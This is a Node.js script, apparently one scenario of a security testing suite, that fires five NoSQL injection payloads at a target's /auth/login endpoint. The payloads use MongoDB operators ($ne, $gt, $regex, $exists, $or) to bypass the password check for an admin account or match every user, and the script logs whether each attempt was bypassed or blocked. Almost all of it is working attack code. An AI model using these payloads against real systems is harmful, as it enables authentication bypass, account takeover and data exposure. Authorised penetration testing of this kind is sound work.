/**
 * Kịch bản 3: Tấn công NoSQL Injection
 *
 * Mục tiêu: Chèn MongoDB operators vào input
 * để bypass xác thực hoặc trích xuất dữ liệu
 */
const axios = require('axios');
const config = require('./config');
const { saveResult, printHeader } = require('./utils');

const ATTACK_NAME = 'NOSQL_INJECTION';

const payloads = [
  {
    name: 'Bypass login ($ne)',
    data: { identifier: 'admin@quikride.com', password: { $ne: '' } },
    description: 'Dùng $ne operator để bypass kiểm tra password',
  },
  {
    name: 'Bypass login ($gt)',
    data: { identifier: 'admin@quikride.com', password: { $gt: '' } },
    description: 'Dùng $gt operator để bypass kiểm tra password',
  },
  {
    name: 'Extract all users ($regex)',
    data: { identifier: { $regex: '.*' }, password: { $ne: '' } },
    description: 'Dùng $regex để match tất cả email',
  },
  {
    name: 'Always true ($exists)',
    data: { identifier: { $exists: true }, password: { $exists: true } },
    description: 'Dùng $exists để bypass cả 2 field',
  },
  {
    name: 'OR injection ($or)',
    data: { $or: [{ identifier: 'admin@quikride.com' }, { identifier: 'x' }], password: { $ne: '' } },
    description: 'Dùng $or để thử nhiều điều kiện',
  },
];

const main = async () => {
  const target = config.target;
  printHeader(ATTACK_NAME, target.name);

  const results = {
    target: target.name,
    tests: [],
    startTime: new Date().toISOString(),
  };

  for (let i = 0; i < payloads.length; i++) {
    const payload = payloads[i];
    console.log(`  --- Test ${i + 1}: ${payload.name} ---`);
    console.log(`  Mô tả: ${payload.description}`);
    console.log(`  Payload: ${JSON.stringify(payload.data)}`);

    try {
      const res = await axios.post(`${target.api}/auth/login`, payload.data, {
        headers: { 'Content-Type': 'application/json' },
      });

      const hasToken = !!(res.data.data?.accessToken || res.data.accessToken);
      results.tests.push({ name: payload.name, status: res.status, result: hasToken ? 'BYPASSED' : 'UNEXPECTED', hasToken });
      console.log(`  → ${res.status} ${hasToken ? 'BYPASSED !!!' : 'UNEXPECTED'}\n`);
    } catch (err) {
      const status = err.response?.status || 'ERROR';
      const message = err.response?.data?.message || err.message;
      results.tests.push({ name: payload.name, status, result: 'BLOCKED', message });
      console.log(`  → ${status} BLOCKED (${message})\n`);
    }
  }

  results.endTime = new Date().toISOString();
  saveResult(ATTACK_NAME, target.name, results);

  const bypassed = results.tests.filter(t => t.result === 'BYPASSED').length;
  const blocked = results.tests.filter(t => t.result === 'BLOCKED').length;
  console.log('\n  ' + '='.repeat(50));
  console.log(`  TỔNG KẾT: ${blocked} BLOCKED | ${bypassed} BYPASSED`);
  console.log('  ' + '='.repeat(50));
};

main().catch(console.error);
